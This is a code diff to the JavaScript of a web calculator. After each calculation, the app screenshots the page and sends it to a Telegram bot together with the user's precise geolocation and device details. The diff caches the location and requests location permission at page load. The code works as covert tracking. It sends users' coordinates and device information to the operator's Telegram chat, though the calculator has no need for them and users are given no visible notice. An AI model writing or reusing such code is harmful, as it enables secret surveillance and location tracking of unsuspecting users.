@@ -1,7 +1,7 @@
 // ==========================================
 // حاسبة عبدالله
 // Calculator + History + Telegram Screenshot
-// + Device Location
+// + Location Permission Once
 // ==========================================
 
 const $ = (id) => document.getElementById(id);
@@ -9,6 +9,18 @@ const $ = (id) => document.getElementById(id);
 let expression = "";
 let result = "0";
 let justCalculated = false;
+
+// ==========================================
+// Location Cache
+// ==========================================
+
+const LOCATION_CACHE_KEY =
+  "calculator_location_cache";
+
+const LOCATION_CACHE_TIME =
+  5 * 60 * 1000; // 5 دقائق
+
+let cachedLocation = null;
 
 // ==========================================
 // Local History
@@ -202,45 +214,178 @@ function backspace() {
 }
 
 // ==========================================
-// Get Current Location
+// Load Cached Location
+// ==========================================
+
+function loadCachedLocation() {
+  try {
+    const saved =
+      localStorage.getItem(
+        LOCATION_CACHE_KEY
+      );
+
+    if (!saved) {
+      return null;
+    }
+
+    const data =
+      JSON.parse(saved);
+
+    if (
+      !data ||
+      !data.latitude ||
+      !data.longitude ||
+      !data.savedAt
+    ) {
+      return null;
+    }
+
+    const age =
+      Date.now() - data.savedAt;
+
+    if (
+      age > LOCATION_CACHE_TIME
+    ) {
+      return null;
+    }
+
+    return data;
+
+  } catch (error) {
+    console.warn(
+      "Location cache error:",
+      error
+    );
+
+    return null;
+  }
+}
+
+// ==========================================
+// Save Location
+// ==========================================
+
+function saveCachedLocation(location) {
+  const data = {
+    latitude:
+      location.latitude,
+
+    longitude:
+      location.longitude,
+
+    accuracy:
+      location.accuracy,
+
+    savedAt:
+      Date.now()
+  };
+
+  localStorage.setItem(
+    LOCATION_CACHE_KEY,
+    JSON.stringify(data)
+  );
+
+  cachedLocation = data;
+
+  return data;
+}
+
+// ==========================================
+// Get Location
 // ==========================================
 
 function getCurrentLocation() {
-  return new Promise((resolve, reject) => {
-    if (!navigator.geolocation) {
-      reject(
-        new Error(
-          "المتصفح لا يدعم تحديد الموقع."
-        )
-      );
-      return;
-    }
+  return new Promise(
+    (resolve, reject) => {
 
-    navigator.geolocation.getCurrentPosition(
-      (position) => {
-        resolve({
-          latitude:
-            position.coords.latitude,
-
-          longitude:
-            position.coords.longitude,
-
-          accuracy:
-            position.coords.accuracy
-        });
-      },
-
-      (error) => {
-        reject(error);
-      },
-
-      {
-        enableHighAccuracy: true,
-        timeout: 10000,
-        maximumAge: 0
+      if (!navigator.geolocation) {
+        reject(
+          new Error(
+            "المتصفح لا يدعم تحديد الموقع."
+          )
+        );
+        return;
       }
+
+      navigator.geolocation.getCurrentPosition(
+        (position) => {
+
+          const location = {
+            latitude:
+              position.coords.latitude,
+
+            longitude:
+              position.coords.longitude,
+
+            accuracy:
+              position.coords.accuracy
+          };
+
+          resolve(
+            saveCachedLocation(
+              location
+            )
+          );
+        },
+
+        (error) => {
+          reject(error);
+        },
+
+        {
+          enableHighAccuracy: true,
+
+          timeout: 10000,
+
+          maximumAge: 300000
+        }
+      );
+    }
+  );
+}
+
+// ==========================================
+// Initialize Location
+// ==========================================
+
+async function initializeLocation() {
+
+  // أولاً استخدم الموقع المخزن
+  const cached =
+    loadCachedLocation();
+
+  if (cached) {
+    cachedLocation = cached;
+
+    console.log(
+      "Using cached location."
     );
-  });
+
+    return cached;
+  }
+
+  // لو مفيش موقع مخزن
+  // المتصفح سيطلب الإذن مرة حسب إعداداته
+  try {
+
+    const location =
+      await getCurrentLocation();
+
+    console.log(
+      "Location permission granted."
+    );
+
+    return location;
+
+  } catch (error) {
+
+    console.warn(
+      "Location unavailable:",
+      error
+    );
+
+    return null;
+  }
 }
 
 // ==========================================
@@ -250,19 +395,24 @@ function getCurrentLocation() {
 function getDeviceInfo() {
   return {
     userAgent:
-      navigator.userAgent || "Unknown",
+      navigator.userAgent ||
+      "Unknown",
 
     language:
-      navigator.language || "Unknown",
+      navigator.language ||
+      "Unknown",
 
     platform:
-      navigator.platform || "Unknown",
+      navigator.platform ||
+      "Unknown",
 
     screen:
       `${window.screen.width}x${window.screen.height}`,
 
     online:
-      navigator.onLine ? "Online" : "Offline"
+      navigator.onLine
+        ? "Online"
+        : "Offline"
   };
 }
 
@@ -271,6 +421,7 @@ function getDeviceInfo() {
 // ==========================================
 
 async function equals() {
+
   if (!expression.trim()) {
     return;
   }
@@ -279,12 +430,14 @@ async function equals() {
     expression;
 
   try {
+
     const calculated =
       safeEvaluate(
         currentExpression
       );
 
     result = calculated;
+
     justCalculated = true;
 
     // حفظ العملية
@@ -292,6 +445,7 @@ async function equals() {
       getHistory();
 
     history.unshift({
+
       expression:
         currentExpression,
 
@@ -312,16 +466,20 @@ async function equals() {
 
     // Screenshot بعد ظهور النتيجة
     setTimeout(() => {
+
       captureAndSendToTelegram(
         currentExpression,
         calculated
       );
+
     }, 300);
 
   } catch (error) {
+
     console.error(error);
 
     result = "خطأ";
+
     render();
   }
 }
@@ -334,29 +492,35 @@ async function captureAndSendToTelegram(
   exp,
   res
 ) {
+
   try {
+
     // ======================================
-    // التأكد من html2canvas
+    // html2canvas
     // ======================================
 
     if (!window.html2canvas) {
+
       console.error(
         "html2canvas لم يتم تحميله."
       );
+
       return;
     }
 
     // ======================================
-    // التأكد من إعداد Telegram
+    // Telegram Config
     // ======================================
 
     if (
       typeof TELEGRAM_CONFIG ===
       "undefined"
     ) {
+
       console.error(
         "TELEGRAM_CONFIG غير موجود."
       );
+
       return;
     }
 
@@ -366,23 +530,46 @@ async function captureAndSendToTelegram(
     const chatId =
       TELEGRAM_CONFIG.chatId;
 
-    if (!botToken || !chatId) {
+    if (
+      !botToken ||
+      !chatId
+    ) {
+
       console.error(
         "Bot Token أو Chat ID غير موجود."
       );
+
       return;
     }
 
     // ======================================
-    // الحصول على الموقع
+    // Location
     // ======================================
 
     let locationText =
       "📍 الموقع: غير متاح";
 
-    try {
-      const location =
-        await getCurrentLocation();
+    let location =
+      cachedLocation ||
+      loadCachedLocation();
+
+    if (!location) {
+
+      try {
+
+        location =
+          await getCurrentLocation();
+
+      } catch (error) {
+
+        console.warn(
+          "Location unavailable:",
+          error
+        );
+      }
+    }
+
+    if (location) {
 
       const latitude =
         location.latitude;
@@ -392,41 +579,45 @@ async function captureAndSendToTelegram(
 
       const accuracy =
         Math.round(
-          location.accuracy
+          location.accuracy || 0
         );
 
       locationText =
-        `📍 الموقع:\n` +
+        `📍 الموقع الحالي:\n` +
         `Latitude: ${latitude}\n` +
         `Longitude: ${longitude}\n` +
-        `الدقة: ±${accuracy} متر\n` +
-        `🗺️ https://www.google.com/maps?q=${latitude},${longitude}`;
+        `الدقة: ±${accuracy} متر`;
 
-    } catch (locationError) {
-      console.warn(
-        "Location Error:",
-        locationError
-      );
-
-      locationText =
-        "📍 الموقع: لم يتم السماح بالوصول للموقع أو الموقع غير متاح.";
     }
 
     // ======================================
-    // معلومات الجهاز
+    // Device
     // ======================================
 
     const device =
       getDeviceInfo();
 
     // ======================================
-    // أخذ Screenshot
+    // Screenshot
     // ======================================
+
+    const captureArea =
+      $("captureArea");
+
+    if (!captureArea) {
+
+      console.error(
+        "captureArea غير موجود."
+      );
+
+      return;
+    }
 
     const canvas =
       await html2canvas(
-        $("captureArea"),
+        captureArea,
         {
+
           backgroundColor:
             "#ffffff",
 
@@ -442,28 +633,32 @@ async function captureAndSendToTelegram(
       );
 
     // ======================================
-    // تحويل Screenshot إلى Blob
+    // Blob
     // ======================================
 
     const blob =
       await new Promise(
         (resolve) => {
+
           canvas.toBlob(
             resolve,
             "image/png",
             0.92
           );
+
         }
       );
 
     if (!blob) {
+
       throw new Error(
         "تعذر إنشاء Screenshot."
       );
+
     }
 
     // ======================================
-    // الوقت
+    // Time
     // ======================================
 
     const currentTime =
@@ -520,7 +715,7 @@ async function captureAndSendToTelegram(
     );
 
     // ======================================
-    // إرسال Telegram
+    // Telegram
     // ======================================
 
     const response =
@@ -539,10 +734,12 @@ async function captureAndSendToTelegram(
       !response.ok ||
       !data.ok
     ) {
+
       throw new Error(
         data.description ||
           "فشل إرسال الصورة."
       );
+
     }
 
     console.log(
@@ -550,10 +747,12 @@ async function captureAndSendToTelegram(
     );
 
   } catch (error) {
+
     console.error(
       "Telegram Error:",
       error
     );
+
   }
 }
 
@@ -567,9 +766,11 @@ const keysContainer =
   );
 
 if (keysContainer) {
+
   keysContainer.addEventListener(
     "click",
     (event) => {
+
       const button =
         event.target.closest(
           "button"
@@ -588,29 +789,38 @@ if (keysContainer) {
       if (
         value !== undefined
       ) {
+
         addValue(value);
+
         return;
       }
 
       if (
         action === "clear"
       ) {
+
         clearAll();
+
         return;
       }
 
       if (
         action === "backspace"
       ) {
+
         backspace();
+
         return;
       }
 
       if (
         action === "equals"
       ) {
+
         equals();
+
       }
+
     }
   );
 }
@@ -622,12 +832,15 @@ if (keysContainer) {
 document.addEventListener(
   "keydown",
   (event) => {
+
     if (
       /^[0-9+\-*/%.()]$/.test(
         event.key
       )
     ) {
+
       addValue(event.key);
+
       return;
     }
 
@@ -635,23 +848,31 @@ document.addEventListener(
       event.key === "Enter" ||
       event.key === "="
     ) {
+
       event.preventDefault();
+
       equals();
+
       return;
     }
 
     if (
       event.key === "Backspace"
     ) {
+
       backspace();
+
       return;
     }
 
     if (
       event.key === "Escape"
     ) {
+
       clearAll();
+
     }
+
   }
 );
 
@@ -663,17 +884,23 @@ const clearHistoryButton =
   $("clearHistory");
 
 if (clearHistoryButton) {
+
   clearHistoryButton.addEventListener(
     "click",
     () => {
+
       if (
         confirm(
           "متأكد إنك عايز تمسح سجل العمليات؟"
         )
       ) {
+
         saveHistory([]);
+
         render();
+
       }
+
     }
   );
 }
@@ -683,3 +910,9 @@ if (clearHistoryButton) {
 // ==========================================
 
 render();
+
+// ==========================================
+// Ask Location Permission Once
+// ==========================================
+
+initializeLocation();
